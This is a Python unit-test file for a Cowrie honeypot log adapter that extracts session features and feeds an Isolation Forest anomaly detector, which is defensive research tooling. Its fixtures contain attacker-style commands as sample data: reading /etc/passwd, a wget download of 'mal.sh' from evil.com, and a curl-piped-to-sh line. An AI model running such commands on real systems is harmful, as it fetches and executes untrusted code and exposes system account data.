"""
Focused unit tests for CowrieSessionAdapter and integration with Module 3.

Verifies:
- Streaming JSONL records incrementally with robust handling of malformed lines and missing fields.
- Session grouping and extraction of command-level events.
- Graceful handling of sessions with no commands (filtered out safely).
- Strict adherence to the canonical 26-feature specification and ordering.
- Feature extraction fidelity for genuine observed metrics vs transparent heuristic enrichment.
- Scaler fitting, serialization, deserialization, and single-scaling consistency.
- Full prediction pipeline compatibility with AnomalyPredictor and Module2InputValidator.
"""

import json
import pathlib
import tempfile
import unittest
import numpy as np

from config import MODULE2_CANONICAL_FEATURE_NAMES, MODULE2_FEATURE_COUNT
from models.predictor import AnomalyPredictor
from preprocessing.validator import Module2InputValidator
from schemas.feature_object import Module2SessionPayload
from schemas.prediction_schema import AnomalyPredictionResult
from training.cowrie_adapter import (
    CowrieSessionAdapter,
    extract_executable_tokens,
    load_adapter_scaler,
    save_adapter_scaler,
)
from training.train_anomaly_detector import train_from_adapter_payloads


class TestCowrieAdapter(unittest.TestCase):
    """Test suite for CowrieSessionAdapter."""

    def setUp(self):
        """Prepare sample events representing realistic Cowrie telemetry."""
        self.adapter = CowrieSessionAdapter(enable_heuristic_enrichment=True)
        self.validator = Module2InputValidator()

        # Synthetic multi-session fixture lines
        self.sample_lines = [
            # Session A: Discovery & Tool Download (3 commands)
            json.dumps({"eventid": "cowrie.session.connect", "session": "sess_alpha", "src_ip": "1.2.3.4", "timestamp": "2026-10-19T10:00:00.000Z"}),
            json.dumps({"eventid": "cowrie.login.success", "session": "sess_alpha", "src_ip": "1.2.3.4", "timestamp": "2026-10-19T10:00:02.000Z"}),
            json.dumps({"eventid": "cowrie.command.input", "session": "sess_alpha", "input": "uname -a", "timestamp": "2026-10-19T10:00:05.000Z"}),
            json.dumps({"eventid": "cowrie.command.input", "session": "sess_alpha", "input": "cat /etc/passwd | grep root", "timestamp": "2026-10-19T10:00:10.000Z"}),
            json.dumps({"eventid": "cowrie.command.input", "session": "sess_alpha", "input": "wget http://evil.com/mal.sh -O /tmp/mal.sh", "timestamp": "2026-10-19T10:00:20.000Z"}),
            json.dumps({"eventid": "cowrie.session.closed", "session": "sess_alpha", "timestamp": "2026-10-19T10:00:25.000Z"}),

            # Session B: Reconnaissance only (2 commands)
            json.dumps({"eventid": "cowrie.session.connect", "session": "sess_bravo", "src_ip": "5.6.7.8", "timestamp": "2026-10-19T11:00:00.000Z"}),
            json.dumps({"eventid": "cowrie.command.input", "session": "sess_bravo", "input": "id", "timestamp": "2026-10-19T11:00:02.000Z"}),
            json.dumps({"eventid": "cowrie.command.input", "session": "sess_bravo", "input": "whoami", "timestamp": "2026-10-19T11:00:04.000Z"}),

            # Session C: No commands (Connection and failed auth only -> should be skipped)
            json.dumps({"eventid": "cowrie.session.connect", "session": "sess_charlie", "src_ip": "9.9.9.9", "timestamp": "2026-10-19T12:00:00.000Z"}),
            json.dumps({"eventid": "cowrie.login.failed", "session": "sess_charlie", "src_ip": "9.9.9.9", "timestamp": "2026-10-19T12:00:01.000Z"}),

            # Malformed lines to test robustness
            "NOT_JSON_LINE_AT_ALL",
            json.dumps({"eventid": "cowrie.session.connect"}),  # Missing session field
            "",  # Empty line
        ]

    # -----------------------------------------------------------------------
    # 1. Parsing, Streaming, and Session Grouping
    # -----------------------------------------------------------------------

    def test_streaming_and_malformed_handling(self):
        """Verify streaming extracts valid sessions while safely ignoring malformed lines."""
        with tempfile.TemporaryDirectory() as tmpdir:
            log_file = pathlib.Path(tmpdir) / "test_cowrie.jsonl"
            log_file.write_text("\n".join(self.sample_lines), encoding="utf-8")

            sessions = list(self.adapter.stream_sessions_from_jsonl(log_file, min_commands=1))

            # Exactly sess_alpha and sess_bravo should be yielded (sess_charlie has 0 commands)
            self.assertEqual(len(sessions), 2)
            session_ids = {s["session_id"] for s in sessions}
            self.assertEqual(session_ids, {"sess_alpha", "sess_bravo"})

            # Verify session alpha command count
            alpha_sess = next(s for s in sessions if s["session_id"] == "sess_alpha")
            self.assertEqual(len(alpha_sess["commands"]), 3)
            self.assertEqual(alpha_sess["src_ip"], "1.2.3.4")

    # -----------------------------------------------------------------------
    # 2. Executable Token Approximation
    # -----------------------------------------------------------------------

    def test_extract_executable_tokens(self):
        """Verify executable token derivation from varied shell syntax."""
        self.assertEqual(extract_executable_tokens("uname -a"), ["uname"])
        self.assertEqual(extract_executable_tokens("/bin/cat /proc/self/exe || cat /proc/self/exe"), ["cat", "cat"])
        self.assertEqual(extract_executable_tokens("sudo busybox wget http://test.com"), ["wget"])
        self.assertEqual(extract_executable_tokens("VAR=1 /usr/bin/curl http://test.com | sh"), ["curl", "sh"])
        self.assertEqual(extract_executable_tokens(""), [])

    # -----------------------------------------------------------------------
    # 3. Canonical 26-Feature Computation & Ordering
    # -----------------------------------------------------------------------

    def test_canonical_26_feature_extraction(self):
        """Verify extraction produces all 26 canonical features in exact order."""
        sess = {
            "session_id": "sess_test",
            "commands": ["uname -m", "wget http://site.com/x -O /tmp/x", "cat /tmp/x | grep test"],
            "timestamps": [
                self.adapter.stream_sessions_from_jsonl.__globals__["parse_iso_timestamp"]("2026-10-19T10:00:00Z"),
                self.adapter.stream_sessions_from_jsonl.__globals__["parse_iso_timestamp"]("2026-10-19T10:00:10Z"),
                self.adapter.stream_sessions_from_jsonl.__globals__["parse_iso_timestamp"]("2026-10-19T10:00:20Z"),
            ],
        }

        features, provenance = self.adapter.compute_session_features(sess)

        # Check all 26 canonical names present
        self.assertEqual(len(features), MODULE2_FEATURE_COUNT)
        for name in MODULE2_CANONICAL_FEATURE_NAMES:
            self.assertIn(name, features)
            self.assertIsInstance(features[name], (int, float))

        # Check observed values
        self.assertEqual(features["total_events"], 3.0)
        self.assertEqual(features["command_count"], 3.0)
        self.assertEqual(features["unique_commands"], 3.0)
        self.assertEqual(features["session_duration_seconds"], 20.0)
        self.assertEqual(features["download_utility_ratio"], 1.0 / 3.0)
        self.assertEqual(features["pipe_ratio"], 1.0 / 3.0)

        # Check heuristic values
        self.assertGreater(features["unique_mitre_techniques"], 0.0)
        self.assertGreater(features["max_risk_score"], 7.0)

        # Check provenance tracking
        self.assertEqual(provenance["total_events"], "GENUINE_OBSERVED")
        self.assertEqual(provenance["unique_processes"], "DERIVED_FROM_COMMAND_EXECUTABLES")
        self.assertEqual(provenance["max_risk_score"], "DETERMINISTIC_HEURISTIC_ENRICHMENT")

    def test_unscaled_features_without_heuristics(self):
        """Verify features when heuristic enrichment is disabled."""
        adapter_raw = CowrieSessionAdapter(enable_heuristic_enrichment=False)
        sess = {
            "session_id": "sess_raw",
            "commands": ["id"],
            "timestamps": [],
        }
        features, provenance = adapter_raw.compute_session_features(sess)

        self.assertEqual(features["mean_risk_score"], 0.0)
        self.assertEqual(features["unique_mitre_tactics"], 0.0)
        self.assertIn("UNAVAILABLE_RAW_TELEMETRY", provenance["mean_risk_score"])

    # -----------------------------------------------------------------------
    # 4. Scaler Fitting, Serialization, and Validation
    # -----------------------------------------------------------------------

    def test_scaling_and_payload_validation(self):
        """Verify scaling produces valid Module2SessionPayload instances."""
        with tempfile.TemporaryDirectory() as tmpdir:
            log_file = pathlib.Path(tmpdir) / "test_cowrie.jsonl"
            log_file.write_text("\n".join(self.sample_lines), encoding="utf-8")

            sessions = list(self.adapter.stream_sessions_from_jsonl(log_file))
            self.assertEqual(len(sessions), 2)

            payloads, scaler, scaler_meta = self.adapter.extract_and_scale_sessions(
                sessions=sessions, fit_scaler=True
            )

            self.assertEqual(len(payloads), 2)
            self.assertIsNotNone(scaler)
            self.assertEqual(scaler_meta["sample_count"], 2)
            self.assertEqual(scaler_meta["provenance"], "fitted_by_module3_cowrie_adapter_on_genuine_cowrie")

            # Validate each payload with Phase 1 strict validator
            for p in payloads:
                self.assertIsInstance(p, Module2SessionPayload)
                self.assertEqual(len(p.feature_vector), MODULE2_FEATURE_COUNT)
                self.assertEqual(p.feature_names, list(MODULE2_CANONICAL_FEATURE_NAMES))
                # Must pass Phase 1 validator without exception
                validated = self.validator.validate(p)
                self.assertEqual(validated.session_id, p.session_id)

            # Test scaler serialization round-trip
            scaler_path, meta_path = save_adapter_scaler(scaler, scaler_meta, tmpdir)
            self.assertTrue(scaler_path.is_file())
            self.assertTrue(meta_path.is_file())

            loaded_scaler, loaded_meta = load_adapter_scaler(tmpdir)
            self.assertEqual(loaded_meta["scaler_version"], "1.0.0-cowrie-adapter-scaler")

            # Check transform consistency
            raw_matrix = np.array([[p.raw_features[name] for name in MODULE2_CANONICAL_FEATURE_NAMES] for p in payloads])
            re_scaled = loaded_scaler.transform(raw_matrix)
            np.testing.assert_array_almost_equal(re_scaled[0], payloads[0].feature_vector)

    # -----------------------------------------------------------------------
    # 5. Integration with Isolation Forest Pipeline
    # -----------------------------------------------------------------------

    def test_adapter_payloads_with_isolation_forest_and_predictor(self):
        """Verify adapter payloads can train an Isolation Forest and run inference."""
        with tempfile.TemporaryDirectory() as tmpdir:
            log_file = pathlib.Path(tmpdir) / "test_cowrie.jsonl"
            log_file.write_text("\n".join(self.sample_lines), encoding="utf-8")

            sessions = list(self.adapter.stream_sessions_from_jsonl(log_file))
            payloads, scaler, scaler_meta = self.adapter.extract_and_scale_sessions(
                sessions=sessions, fit_scaler=True
            )

            # Train model using adapter payloads
            model, metadata = train_from_adapter_payloads(
                payloads=payloads,
                scaler_metadata=scaler_meta,
                n_estimators=10,
                is_production_validated=False,
            )

            self.assertIn("standardized_by_module3_cowrie_adapter", metadata["scaler_assumptions"])

            # Run inference using AnomalyPredictor
            predictor = AnomalyPredictor(model=model, metadata=metadata)
            result = predictor.predict_session(payloads[0])

            self.assertIsInstance(result, AnomalyPredictionResult)
            self.assertEqual(result.session_id, "sess_alpha")
            self.assertIsInstance(result.anomaly_score, float)
            self.assertIsInstance(result.is_anomaly, bool)
            self.assertTrue(len(result.limitations) > 0)


if __name__ == "__main__":
    unittest.main()
